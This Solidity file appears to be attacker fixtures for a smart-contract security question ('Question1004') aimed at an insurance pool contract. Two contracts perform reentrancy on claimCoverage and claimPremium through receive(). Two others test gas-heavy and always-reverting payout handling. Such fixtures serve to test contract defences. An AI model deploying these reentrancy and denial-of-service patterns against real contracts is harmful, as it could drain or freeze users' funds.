// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface toAttack {
    function insure(
        uint256 _coverageAmount,
        address _poolAddress
    ) external payable;
    function claimPremium(address _poolAddress) external;
    function claimCoverage(address _poolAddress) external;
    function approveClaimCoverage(
        address _poolAddress,
        address _policyHolder
    ) external;
    function depositFunds(address _poolAddress) external payable;
    function calculatePremium(
        uint256 _coverageAmount,
        address _poolAddress
    ) external view returns (uint256 premium);
}

contract Question1004Attacker1 {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function initForTwo() external payable{
        toAttack(target).insure{value:toAttack(target).calculatePremium(1 ether, address(this))}(1 ether, address(this));
    }

    function initForThree() external payable{
        toAttack(target).depositFunds{value: 1 ether}(address(this));
    }

    function attack2() external payable {
        toAttack(target).claimCoverage(address(this));
    }

    function attack3() external payable {
        toAttack(target).claimPremium(address(this));
    }

    receive() external payable {
        uint res;
        for (uint i = 0; i < 100; i++) {
            res += uint(keccak256(abi.encode(i))) % 10000;
        }
    }

    fallback() external payable {}
}

contract Question1004Attacker2 {
    address public target;

    constructor(address _target) {
        target = _target;
    }
    function initForTwo() external payable{
        toAttack(target).insure{value:toAttack(target).calculatePremium(1 ether, address(this))}(1 ether, address(this));
    }

    function initForThree() external payable{
        toAttack(target).depositFunds{value: 1 ether}(address(this));
    }

    function attack2() external payable {
        toAttack(target).claimCoverage(address(this));
    }

    function attack3() external payable {
        toAttack(target).claimPremium(address(this));
    }


    fallback() external {
        revert("aaa");
    }
}

contract Question1004Attacker3 {
    address public target;

    uint private _stack;

    constructor(address _target) {
        target = _target;
    }

    function initForTwo() external payable{
        toAttack(target).insure{value:toAttack(target).calculatePremium(1 ether, address(this))}(1 ether, address(this));
    }

    function attack() public payable {
        toAttack(target).claimCoverage(address(this));
    }

    receive() external payable {
        if (_stack < 1) {
            _stack += 1;
            attack();
        } else {
            _stack = 0;
        }
    }

    fallback() external payable {}
}

contract Question1004Attacker4 {
    address public target;

    uint private _stack;

    constructor(address _target) {
        target = _target;
    }

    function initForThree() external payable{
        toAttack(target).depositFunds{value: 1 ether}(address(this));
    }

    function attack() public payable {
        toAttack(target).claimPremium(address(this));
    }
    receive() external payable {
        if (_stack < 1) {
            _stack += 1;
            attack();
        } else {
            _stack = 0;
        }
    }

    fallback() external payable {}
}
